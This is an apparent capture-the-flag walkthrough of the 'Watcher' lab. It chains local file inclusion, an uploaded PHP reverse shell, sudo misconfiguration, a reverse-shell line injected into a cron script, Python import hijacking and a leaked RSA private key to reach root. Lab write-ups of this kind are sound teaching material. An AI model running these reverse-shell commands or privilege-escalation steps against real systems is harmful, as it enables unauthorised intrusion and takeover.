# Enumeration

## Ports
- Found 3, first 1000 ports running on the machine.

```console
❯ rustscan -a 10.10.28.52 --ulimit 5000 -- -sC -sV -vvv | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.28.52:22
Open 10.10.28.52:21
Open 10.10.28.52:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-22 14:53 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
Initiating Ping Scan at 14:53
Scanning 10.10.28.52 [2 ports]
Completed Ping Scan at 14:53, 1.36s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:53
Completed Parallel DNS resolution of 1 host. at 14:53, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:53
Scanning 10.10.28.52 [3 ports]
Discovered open port 21/tcp on 10.10.28.52
Discovered open port 80/tcp on 10.10.28.52
Discovered open port 22/tcp on 10.10.28.52
Completed Connect Scan at 14:53, 0.16s elapsed (3 total ports)
Initiating Service scan at 14:53
Scanning 3 services on 10.10.28.52
Completed Service scan at 14:53, 6.38s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.28.52.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 5.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 1.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
Nmap scan report for 10.10.28.52
Host is up, received conn-refused (0.96s latency).
Scanned at 2022-11-22 14:53:35 IST for 13s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.19 seconds
```

# Web (Manual)
- The homepage consists 3 links for different pages 


# Flag1
- Checked out `/robots.txt` and found flag 1 and `secret_file_do_not_read.txt`

```console
❯ curl watcher.thm/robots.txt
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

- Checked out the flag.

```console
❯ curl watcher.thm/flag_1.txt
FLAG{robots_dot_text_what_is_next}
```

# Flag 2
- We don't have permission to read `secret_file_do_not_read.txt`

```console
❯ curl watcher.thm/secret_file_do_not_read.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at watcher.thm Port 80</address>
</body></html>
```

- Went back to the homepage and found LFI in product seeing page.

```console
❯ curl watcher.thm/post.php\?post=/etc/passwd
<!-----snip----------->
<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
 </div>
</div>

</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
    <p>&copy; Corkplacemats 2020</p>
  </div>
</footer>
```

- From here got the `secret_file_do_not_read.txt` file.

```console
❯ curl watcher.thm/post.php\?post=secret_file_do_not_read.txt

<--------------------snip------------------------>
<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
 </div>
</div>

</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
    <p>&copy; Corkplacemats 2020</p>
  </div>
</footer>
</html>

```

- Got credential for FTP 
- Logged into FTP and found flag 2

```console
❯ ftp watcher.thm
Connected to watcher.thm.
220 (vsFTPd 3.0.3)
Name (watcher.thm:divu050704): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||47540|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 22 10:12 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> ls files
229 Entering Extended Passive Mode (|||43223|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> get flag_2.txt
local: flag_2.txt remote: flag_2.txt
229 Entering Extended Passive Mode (|||45569|)
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
100% |******************************************************************************************************************************************|    21      306.08 KiB/s    00:00 ETA
226 Transfer complete.
21 bytes received in 00:00 (0.13 KiB/s)
ftp> exit
221 Goodbye.
❯ cat flag_2.txt
FLAG{ftp_you_and_me}
```

# Flag 3
- Put a test file to `/files` in ftp as we can access it from LFI.
- We can access this test file

```console
❯ curl watcher.thm/post.php\?post=/home/ftpuser/ftp/files/test
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v4.1.1">
    <title>Corkplacemats</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/album/">

<link href="css/bootstrap.min.css" rel="stylesheet">

    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <!-- Custom styles for this template -->
    <link href="album.css" rel="stylesheet">
  </head>
  <body>
    <header>
  <div class="collapse bg-dark" id="navbarHeader">
    <div class="container">
      <div class="row">
        <div class="col-sm-8 col-md-7 py-4">
          <h4 class="text-white">About</h4>
        </div>
        <div class="col-sm-4 offset-md-1 py-4">
          <h4 class="text-white">Contact</h4>
          <ul class="list-unstyled">
            <li><a href="#" class="text-white">Follow on Twitter</a></li>
            <li><a href="#" class="text-white">Like on Facebook</a></li>
            <li><a href="#" class="text-white">Email me</a></li>
          </ul>
        </div>
      </div>
    </div>
  </div>
  <div class="navbar navbar-dark bg-dark shadow-sm">
    <div class="container d-flex justify-content-between">
      <a href="/" class="navbar-brand d-flex align-items-center">
        <strong>Corkplacemats</strong>
      </a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarHeader" aria-controls="navbarHeader" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
    </div>
  </div>
</header>

<main role="main">

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  test
 </div>
</div>

</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
    <p>&copy; Corkplacemats 2020</p>
  </div>
</footer>
</html>
```

- Made a php reverse shell file and uploaded it to the ftp `/files` 

```console
❯ ftp watcher.thm
Connected to watcher.thm.
220 (vsFTPd 3.0.3)
Name (watcher.thm:divu050704): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd files
250 Directory successfully changed.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||40260|)
150 Ok to send data.
100% |******************************************************************************************************************************************|  5495       30.46 MiB/s    00:00 ETA
226 Transfer complete.
5495 bytes sent in 00:00 (17.56 KiB/s)
ftp> exit
221 Goodbye.
```

- Started a reverse shell on port 1234 and made a get request to `watcher.thm/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php`.
- Caught a reverse shell

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.28.52] 59964
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:24:50 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (912): Inappropriate ioctl for device
bash: no job control in this shell
www-data@watcher:/$
```

- Searched for flag 3 and found it `/var/www/html/more_secrets_a9f10a/`

```console
www-data@watcher:/$ find -name "flag_3.txt" 2>/dev/null
./var/www/html/more_secrets_a9f10a/flag_3.txt
```


# Flag 4
- Searched for flag 4
- We don't have permission to read it as the owner is toby.

```console
www-data@watcher:/$ cat $(find -name "flag_4.txt" 2>/dev/null)
cat: ./home/toby/flag_4.txt: Permission denied
```

- Checked for `sudo` commands that `www-data` can run.

```console
www-data@watcher:/$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL

```

- `www-data` can run all commands as `toby` without password.
- Started bash as `toby`.

```console
www-data@watcher:/$ sudo -u toby bash
toby@watcher:/$

```
Found flag 4 

```console
toby@watcher:~$ cat flag_4.txt
FLAG{chad_lifestyle}
```


# Flag 5
- In the home directory of `toby` found `notes.txt`, saying about a `cronjob` set up by `mat`.

```console
toby@watcher:~$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

- Checked for `cronjobs` 

```console
toby@watcher:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

- Checked writing permission for `/home/toby/jobs/cow.sh`.

```console
toby@watcher:~$ ls -l /home/toby/jobs/cow.sh
-rwxr-xr-x 1 toby toby 46 Dec  3  2020 /home/toby/jobs/cow.sh
```

- Toby can read and write the file 

```console
toby@watcher:~$ echo "sh -i >& /dev/tcp/10.17.0.215/4444 0>&1" >> jobs/cow.sh
toby@watcher:~$ cat jobs/cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
sh -i >& /dev/tcp/10.17.0.215/4444 0>&1
```

- Caught reverse shell

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.28.52] 51578
sh: 0: can't access tty; job control turned off
$ whoami
mat
```

- Stabilized the shell
- Found the flag 5

```console
mat@watcher:~$ ls
cow.jpg  flag_5.txt  note.txt  scripts
mat@watcher:~$ cat flag_5.txt
FLAG{live_by_the_cow_die_by_the_cow}
```


# Flag 6
- We can see in the home directory of `mat` a `note.txt`, which says that `will` has given `mat` sudo rights to run `python` as `will` for `/home/mat/scripts/will_script.py`

```console
mat@watcher:~$ cat note.txt 
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

- Checked out file permissions, it is owned by `will`, will execute as `will`, but we can't edit it

```console
mat@watcher:~/scripts$ ls -l
total 12
-rw-r--r-- 1 mat  mat   133 Nov 22 11:03 cmd.py
drwxr-xr-x 2 will will 4096 Nov 22 11:03 __pycache__
-rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py
```

- On reading `will_script.py`, found that the script is using an external library named `cmd`, above we can also see `cmd.py` editable by `mat`.

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
	print("Invalid command!")
	exit()

os.system(cmd)
```

- We can only run `ls -lah`, `id`, `cat /etc/passwd` files.

```console
mat@watcher:~/scripts$ cat cmd.py
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"
```

- Imported OS library and added code to call bash shell in `cmd.py`.

```python
import os
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"

os.system("/bin/bash -p")
```
 - Now run `will_script.py` as `Will`.

```console
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
will@watcher:~/scripts$
```

- Got flag 6 

```console
will@watcher:~$ cd /home/will
will@watcher:/home/will$ ls
flag_6.txt
will@watcher:/home/will$ cat flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```


# Flag 7
- Hint Says that there is an `id_rsa` file, its not in home directory, as every backup, it should in `/opt` directory :bulb:
- Found it as `/opt/backups/key.b64`

```console
will@watcher:/opt/backups$ cat key.b64  | base64 -d
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

- Saved it to the attacking machine.
- Only user left with shell is `root`

```console
will@watcher:/opt/backups$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
```

- Logged in as root 

```console
❯ ssh root@watcher.thm -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 22 11:25:43 UTC 2022

  System load:  0.08               Processes:             115
  Usage of /:   22.4% of 18.57GB   Users logged in:       1
  Memory usage: 56%                IP address for eth0:   10.10.28.52
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~#
```
- Got flag 7

```console
root@watcher:~# cat /root/flag_7.txt
FLAG{who_watches_the_watchers}

```
